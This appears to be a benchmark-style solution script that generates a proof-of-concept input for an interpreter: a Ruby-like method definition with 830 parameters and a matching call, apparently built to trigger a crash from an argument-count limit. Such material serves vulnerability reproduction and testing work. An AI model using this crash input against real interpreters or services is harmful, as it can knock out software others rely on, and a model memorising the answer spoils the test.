class Solution:
    def solve(self, src_path: str) -> bytes:
        n = 830
        params = [f"a{i}" for i in range(n)]
        def_line = f"def m({','.join(params)});end\n"
        args = [str(i + 1) for i in range(n)]
        call_line = f"m({','.join(args)})\n"
        poc = def_line + call_line
        return poc.encode('ascii')
